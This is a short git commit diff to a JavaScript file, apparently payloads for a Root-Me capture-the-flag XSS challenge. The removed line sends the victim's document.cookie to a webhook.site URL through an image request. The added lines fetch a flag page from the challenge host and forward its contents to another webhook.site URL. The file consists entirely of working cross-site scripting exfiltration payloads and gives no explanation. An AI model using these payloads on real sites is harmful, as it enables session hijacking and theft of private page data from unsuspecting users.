cd41d58dbb95f726b79d0c240903bee023935354
Noctu <81293192+Nxctu@users.noreply.github.com>
2024-09-19 14:22:26 +0100

    Update rien.js

--- rien.js
+++ rien.js
@@ -1,1 +1,3 @@
-(new Image).src="https://webhook.site/9afb0f42-2b56-4838-a8e6-cb053669dff8?c="+document.cookie
+a=await fetch("http://challenge01.root-me.org:58007/flag")
+b=await a.text()
+c=fetch("https://webhook.site/db745ab0-1770-43e8-a2e9-6ea374d07163?contenu="+encodeURI(b))
